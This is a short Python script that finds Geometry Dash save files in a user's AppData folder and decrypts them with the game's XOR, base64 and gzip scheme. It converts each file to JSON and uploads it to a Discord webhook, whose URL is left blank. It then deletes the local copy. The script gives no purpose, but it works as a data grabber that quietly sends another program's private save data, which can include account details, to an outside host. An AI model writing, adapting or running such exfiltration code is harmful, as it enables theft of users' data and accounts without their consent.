from dhooks import Webhook, File
import os
import time
import base64
import gzip
import json
import xmltodict

def xor(string: str, key: int) -> str:
    return "".join(chr(ord(char) ^ key) for char in string)

def decrypt_data(data: bytes) -> str:
    data_str = data.decode()
    base64_decoded = base64.urlsafe_b64decode(xor(data_str, key=11).encode())
    decompressed = gzip.decompress(base64_decoded)
    return decompressed.decode()

def xml_to_json(xml_data):
    return json.dumps(xmltodict.parse(xml_data), indent=2)

try:
    hook = Webhook("")

    file_names = ["CCGameManager.dat", "CCGameManager2.dat", "CCLocalLevels.dat", "CCLocalLevels2.dat"]
    appdata_dir = os.path.join(os.path.expanduser("~"), "AppData", "Local", "GeometryDash")

    for file_name in file_names:
        file_path = os.path.join(appdata_dir, file_name)

        if os.path.exists(file_path):
            with open(file_path, 'rb') as file:
                encrypted_data = file.read()
                decrypted_data = decrypt_data(encrypted_data)

            json_data = xml_to_json(decrypted_data)

            json_file_name = f"{file_name}.json"
            with open(json_file_name, 'w') as json_file:
                json_file.write(json_data)

            hook.send(f"Converted JSON File: {file_name}", file=File(json_file_name))
            print(f"Converted and sent as JSON: {file_name}")

            os.remove(json_file_name)
        else:
            print(f"Resources not found")

except Exception as e:
    print("An error occurred:", e)

time.sleep(2)
